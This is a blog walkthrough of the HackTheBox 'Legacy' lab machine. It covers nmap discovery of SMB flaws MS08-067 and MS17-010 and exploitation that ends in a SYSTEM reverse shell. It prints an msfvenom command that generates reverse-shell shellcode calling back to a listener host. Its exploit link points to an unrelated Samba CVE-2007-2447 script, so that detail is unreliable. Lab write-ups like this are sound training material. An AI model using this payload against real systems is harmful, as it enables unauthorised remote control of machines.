---
layout: post
title:  "HackTheBox Legacy Walkthrough"
date:   2020-01-07 00:00:00 -0500
categories: Tutorials
---

```
 _                                 
| |                                
| |     ___  __ _  __ _  ___ _   _ 
| |    / _ \/ _` |/ _` |/ __| | | |
| |___|  __/ (_| | (_| | (__| |_| |
\_____/\___|\__, |\__,_|\___|\__, |
             __/ |            __/ |
            |___/            |___/ 
```


A good beginner box with multiple vulnerabilties.
<br/>

There are two SMB vulnerabilties that I found:
* smb-vuln-ms08-067 - This is Vuln that we will be going over in this walkthrough.
* smb-vuln-ms17-010 - One of my top favorite exploits, WannaCry/EternalBlue.


<br/>
<br/>


**1)** Scanned and saw that port 445 was open, also saw that the OS was running Windows XP.
![NMAP]({{ "/files/HTBLegacy_00.png" | absolute_url }})<br/> 
<br/>

**2)** Ran nmap SMB scripts to find vulnerabilities. Found *smb-vuln-ms08-067* and *smb-vuln-ms17-010*.
![vulns]({{ "/files/HTBLegacy_01.png" | absolute_url }})<br/>
<br/>

**3)** Found this exploit for *smb-vuln-ms08-67* on GitHub, be sure to install the required impacket dependencies. <https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py>
<br/>
All that is needed to be replaced is the shellcode with your own.
```msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows```
![shellcode]({{ "/files/HTBLegacy_02.png" | absolute_url }})<br/>
<br/>

**4)** Ran the ms08_067_2018.py exploit and was able to get a root reverse shell. Found the user.txt and root.txt. <br/>
![reverseShell]({{ "/files/HTBLegacy_03.png" | absolute_url }})<br/>
![user]({{ "/files/HTBLegacy_04.png" | absolute_url }})<br/>
![root]({{ "/files/HTBLegacy_05.png" | absolute_url }})<br/>